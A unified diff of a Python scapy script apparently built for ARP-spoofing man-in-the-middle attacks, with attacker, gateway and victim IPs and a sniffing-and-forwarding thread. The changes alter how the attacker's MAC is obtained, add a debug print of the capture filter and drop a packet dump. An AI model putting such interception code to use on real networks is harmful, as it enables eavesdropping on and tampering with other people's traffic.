@@ -12,6 +12,7 @@ import Queue
 sp.conf.verb = 0
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 REPLAY = 2
+from uuid import getnode as get_mac
 
 
 class Attack_Info(object, ):
@@ -19,7 +20,7 @@ class Attack_Info(object, ):
         self.mIP = my_ip
         self.gIP = gate_ip
         self.vIP = victim_ip
-        self.mac = [sp.get_if_hwaddr(i) for i in sp.get_if_list()][0]
+        self.mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
         self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]}
 
     @staticmethod
@@ -99,6 +100,7 @@ class Mitm_Thread(threading.Thread):
     def run(self, ):
         self.forwader.start()
         bpf_filter = '(not (dst host %s or  src host %s)) and ether dst %s' % (info.mIP, info.mIP, info.mac) 
+        print bpf_filter
         while self.stop.wait(0):
             sp.sniff(filter=bpf_filter, timeout=5, prn=lambda pkt: self.q.put(pkt))
         self.q.put("exit")
@@ -107,7 +109,6 @@ class Mitm_Thread(threading.Thread):
             pkt = self.q.get()
             if pkt == "exit": break
             if pkt.haslayer(sp.IP):
-                pkt.show()
                 ip = pkt.getlayer(sp.IP)
                 get_mac = lambda x: info.arp_table.get(x, info.arp_table[info.gIP])
                 ether = sp.Ether(dst=get_mac(ip.dst))
